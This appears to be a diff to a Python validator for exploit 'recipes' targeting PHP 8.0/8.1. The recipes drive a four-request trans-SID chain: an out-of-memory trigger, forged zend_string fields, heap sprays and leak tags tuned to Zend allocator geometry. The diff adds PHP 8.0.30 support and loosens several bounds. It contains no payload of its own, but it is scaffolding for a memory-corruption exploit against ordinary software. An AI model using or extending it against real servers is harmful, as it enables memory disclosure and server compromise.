@@ -392,15 +392,25 @@ def validate_profile(data: dict[str, Any], *, source: str = "profile") -> None:
     if recipe_strategy == "pure-http-oom-v1":
         _validate_pure_http_recipe(recipe, parsed_abi, page, chunk, max_input_vars)
     elif recipe_strategy == "php81-trans-sid-v1":
+        trans_sid_memory = {
+            "8.0.30": "108M",
+            "8.1.34": "128M",
+        }
+        expected_memory = trans_sid_memory.get(php["version"])
+        if expected_memory is None:
+            raise ProfileError(
+                f"{source}: php81-trans-sid-v1 has no verified exact-build "
+                f"geometry for PHP {php['version']}"
+            )
         if (
-            runtime["memory_limit"] != "128M"
+            runtime["memory_limit"] != expected_memory
             or runtime["post_max_size"] != "192M"
             or runtime["upload_max_filesize"] != "192M"
             or max_input_vars != 1000
         ):
             raise ProfileError(
                 f"{source}: php81-trans-sid-v1 requires the exact "
-                "128M/192M/192M/1000 runtime"
+                f"{expected_memory}/192M/192M/1000 runtime for PHP {php['version']}"
             )
         _validate_php81_trans_sid_recipe(
             recipe, parsed_abi, page, chunk, max_input_vars
@@ -610,15 +620,15 @@ def _validate_php81_trans_sid_recipe(
     chunk: int,
     max_input_vars: int,
 ) -> None:
-    """Validate the bounded four-request PHP 8.1 trans-SID chain.
+    """Validate the bounded four-request PHP 8.0/8.1 trans-SID chain.
 
     This strategy is intentionally a separate recipe.  Its FILE_START OOM,
     trans-SID disclosure, streamed terminal producer, and terminal reclaim all
-    rely on one exact PHP 8.1.34 allocator geometry.
+    rely on exact, profile-bound allocator geometry.
     """
     _keys(recipe, "request_recipe", ("strategy", "query_fields", "a1", "b1", "a2", "b2"))
     if recipe["strategy"] != "php81-trans-sid-v1":
-        raise ProfileError("PHP 8.1 trans-SID recipe has the wrong strategy name")
+        raise ProfileError("PHP 8.x trans-SID recipe has the wrong strategy name")
     _bounded_int(recipe["query_fields"], "request_recipe.query_fields", 0, 32)
 
     a1 = _need_obj(recipe["a1"], "request_recipe.a1")
@@ -678,7 +688,7 @@ def _validate_php81_trans_sid_recipe(
     a1_file = _need_obj(a1["file"], "a1.file")
     _keys(a1_file, "a1.file", ("name_len", "filename_len", "content_type_len", "value_len"))
     _bounded_int(a1_file["name_len"], "a1.file.name_len", 1, 4096)
-    _bounded_int(a1_file["filename_len"], "a1.file.filename_len", 1, 4096)
+    _bounded_int(a1_file["filename_len"], "a1.file.filename_len", 1, 1 << 20)
     _bounded_int(a1_file["content_type_len"], "a1.file.content_type_len", 1, 4096)
     _bounded_int(a1_file["value_len"], "a1.file.value_len", 0, 4096)
     a1_fields = (
@@ -686,7 +696,7 @@ def _validate_php81_trans_sid_recipe(
         + pre_scalar_count + len(mix)
     )
     if a1_fields > max_input_vars:
-        raise ProfileError("PHP 8.1 A1 fields exceed runtime.max_input_vars")
+        raise ProfileError("PHP 8.x trans-SID A1 fields exceed runtime.max_input_vars")
 
     b1 = _need_obj(recipe["b1"], "request_recipe.b1")
     _keys(b1, "request_recipe.b1", (
@@ -699,8 +709,11 @@ def _validate_php81_trans_sid_recipe(
     _bounded_int(b1["boundary_len"], "b1.boundary_len", 8, 128)
     target_offset = parse_hex(b1["target_offset"], "b1.target_offset")
     fake_len = parse_hex(b1["fake_len"], "b1.fake_len")
-    if not 0x20 <= target_offset < chunk or not page <= fake_len <= chunk:
-        raise ProfileError("b1 target/fake length must stay inside one Zend MM chunk")
+    if not 0x20 <= target_offset < chunk or not page <= fake_len <= 4 * chunk:
+        raise ProfileError(
+            "b1 target must stay inside one Zend MM chunk and fake length "
+            "must stay within four chunks"
+        )
     overhead = _bounded_int(b1["allocator_overhead"], "b1.allocator_overhead", 1, 1024)
     value_data_offset = _bounded_int(
         b1["value_data_offset"], "b1.value_data_offset", abi["zend_string"]["val"], chunk
@@ -715,14 +728,14 @@ def _validate_php81_trans_sid_recipe(
     hit_index = _bounded_int(
         b1["hit_index"], "b1.hit_index", 0, head_count + tail_count
     )
-    if hit_index != head_count + 1:
-        raise ProfileError("b1.hit_index must select the first forged field after the partial flood")
+    if hit_index == head_count:
+        raise ProfileError("b1.hit_index must select a forged field, not the partial flood")
     header = target_offset - value_data_offset
     if header < 0 or header + 0x20 > forged_pages * page - overhead:
         raise ProfileError("b1 forged field cannot contain the fake zend_string")
     nested_fillers = _bounded_int(b1["nested_fillers"], "b1.nested_fillers", 0, 4096)
     if 2 + head_count + 1 + tail_count + nested_fillers > max_input_vars:
-        raise ProfileError("PHP 8.1 B1 fields exceed runtime.max_input_vars")
+        raise ProfileError("PHP 8.x trans-SID B1 fields exceed runtime.max_input_vars")
     prefix = _need_str(b1["expected_prefix"], "b1.expected_prefix")
     if not re.fullmatch(r"/[0-9]{2}B{5}", prefix):
         raise ProfileError("b1.expected_prefix must be an indexed eight-byte leak tag")
@@ -772,7 +785,7 @@ def _validate_php81_trans_sid_recipe(
     if not _power_of_two(stream_chunk) or large_len % stream_chunk:
         raise ProfileError("a2 stream chunk must be a power of two that divides the large field")
     if filler_count + 4 > max_input_vars:
-        raise ProfileError("PHP 8.1 A2 fields exceed runtime.max_input_vars")
+        raise ProfileError("PHP 8.x trans-SID A2 fields exceed runtime.max_input_vars")
 
     b2 = _need_obj(recipe["b2"], "request_recipe.b2")
     _keys(b2, "request_recipe.b2", (
@@ -786,7 +799,7 @@ def _validate_php81_trans_sid_recipe(
             raise ProfileError(f"b2.{key} must be a bounded ASCII token")
     spray_count = _bounded_int(b2["spray_count"], "b2.spray_count", 1, 4096)
     if spray_count + 2 > max_input_vars:
-        raise ProfileError("PHP 8.1 B2 fields exceed runtime.max_input_vars")
+        raise ProfileError("PHP 8.x trans-SID B2 fields exceed runtime.max_input_vars")
     _bounded_int(b2["name_len"], "b2.name_len", 1, 128)
     value_len = _bounded_int(b2["value_len"], "b2.value_len", 1, page)
     reference_offset = parse_hex(b2["reference_offset"], "b2.reference_offset")
